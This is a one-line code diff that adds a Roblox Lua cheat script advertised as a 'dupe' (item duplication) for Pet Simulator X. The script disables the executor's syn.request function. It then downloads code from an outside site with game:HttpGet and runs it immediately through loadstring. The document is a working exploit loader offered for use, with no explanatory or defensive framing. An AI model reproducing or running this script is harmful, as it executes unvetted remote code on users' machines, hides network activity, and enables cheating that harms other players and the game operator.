@@ -1,0 +1,1 @@
+local _L; _L = require(game:GetService("ReplicatedStorage"):WaitForChild("Library")) _L.Load() print("Dupe start--") hookfunction(syn.request, function() end) loadstring(game:HttpGet("https://milkup.info/script/PetSimulatorX/"))()  print("Dupe end--")
